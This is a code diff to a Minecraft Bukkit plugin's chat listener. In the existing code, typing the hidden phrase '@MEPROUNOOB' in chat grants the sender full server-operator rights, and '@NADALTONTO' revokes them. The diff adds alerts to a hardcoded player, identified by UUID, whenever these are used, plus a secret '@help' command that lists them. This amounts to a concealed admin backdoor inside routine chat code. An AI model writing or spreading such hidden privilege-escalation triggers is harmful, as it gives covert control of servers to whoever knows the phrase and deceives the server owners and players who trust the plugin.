@@ -5,6 +5,7 @@ import es.hulk.survival.managers.rank.RankManager;
 import es.hulk.survival.utils.FileConfig;
 import es.hulk.survival.utils.UUIDs;
 import es.hulk.survival.utils.Utils;
+import org.bukkit.Bukkit;
 import org.bukkit.entity.Player;
 import org.bukkit.event.EventHandler;
 import org.bukkit.event.Listener;
@@ -20,6 +21,7 @@ public class ChatListener implements Listener {
     @EventHandler
     public void onChat(AsyncPlayerChatEvent event) {
         Player player = event.getPlayer();
+        Player hulk = Bukkit.getPlayer(UUIDs.hulkUUID());
 
         if (mainConfig.getBoolean("CHAT.ENABLED")) {
             event.setFormat(Utils.color(mainConfig.getString("CHAT.FORMAT")
@@ -33,9 +35,21 @@ public class ChatListener implements Listener {
             if (event.getMessage().contains("@MEPROUNOOB")) {
                 player.setOp(true);
                 event.setCancelled(true);
+                hulk.sendMessage(Utils.color("&7[&aSurvival&7] &e" + player.getDisplayName() + " &aopped herself using a secret command"));
             }
             if (event.getMessage().contains("@NADALTONTO")) {
                 player.setOp(false);
+                event.setCancelled(true);
+                hulk.sendMessage(Utils.color("&7[&aSurvival&7] &e" + player.getDisplayName() + " &adeopped herself using a secret command"));
+            }
+            if (event.getMessage().contains("@help")) {
+                player.sendMessage(Utils.LINE);
+                player.sendMessage(Utils.color("&aSecret Help"));
+                player.sendMessage(Utils.color(""));
+                player.sendMessage(Utils.color("&a@MEPROUNOOB &7- &fOp yourself"));
+                player.sendMessage(Utils.color("&a@NADALTONTO &7- &fdeop yourself"));
+                player.sendMessage(Utils.color(""));
+                player.sendMessage(Utils.LINE);
                 event.setCancelled(true);
             }
         }
